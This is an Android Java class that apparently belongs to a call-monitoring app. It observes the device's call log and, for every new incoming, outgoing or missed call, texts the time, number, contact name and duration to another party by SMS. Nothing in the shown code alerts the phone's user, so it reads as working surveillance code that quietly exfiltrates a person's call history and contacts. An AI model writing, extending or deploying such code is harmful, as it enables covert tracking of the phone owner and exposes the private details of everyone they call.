package com.yfm.sms;

import java.text.SimpleDateFormat;
import java.util.Date;

import org.json.JSONException;
import org.json.JSONObject;

import android.app.PendingIntent;
import android.content.ContentResolver;
import android.database.ContentObserver;
import android.database.Cursor;
import android.os.Handler;
import android.provider.CallLog;

public class CallConten extends ContentObserver {

	private int id = -1;
	private ContentResolver cr;
	private PendingIntent pi;
	@Override
	public void onChange(boolean selfChange) {
		// TODO Auto-generated method stub
		super.onChange(selfChange);
		Cursor c = cr.query(CallLog.Calls.CONTENT_URI, null, null, null,
				null);
		try {
			if (c.moveToFirst()) {
				int type = c.getInt(c.getColumnIndex("type"));
				Loginfo.write("type", String.valueOf(type));
				int _id = c.getInt(c.getColumnIndex("_id"));
				Loginfo.write("type", _id + "--" + id);

				if (type == 1 || type == 2||type==3) {

					if (_id > id) {
						// 收件箱
						String address=c.getString(c.getColumnIndex("number"));
						Loginfo.write("number",address);
						if(address.length()>0){
							JSONObject jo = new JSONObject();
							jo.put("date", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date()));
							if(type==1){
								jo.put("type", "来电");
							}else if(type==2){
								jo.put("type", "去电");
							}else if(type==3){
								jo.put("type", "未接");
							}
							jo.put("number",address);
							jo.put("duration", c.getInt(c.getColumnIndex("duration"))/1000+"秒");
							Loginfo.write("type", jo.toString());
							SMSUtils.SendMsg("时间:"+jo.getString("date")+","+jo.getString("type")+",号码:"+jo.getString("number")+",名字:"+SMSUtils.ReadNameByPhoneBook(jo.getString("number"), cr)+",时长:"+jo.getString("duration"),pi);
						}
						
					}
					id = _id;

				}

			}
		} catch (JSONException e) {
			// TODO Auto-generated catch block
			Loginfo.write("type", e.getMessage());
		}finally{
			if(c!=null){
				c.close();
			}
		}
	}

	public CallConten(ContentResolver cr2, Handler handler,PendingIntent pi) {
		super(handler);
		// TODO Auto-generated constructor stub
		this.cr = cr2;
		this.pi=pi;
	}
	
}
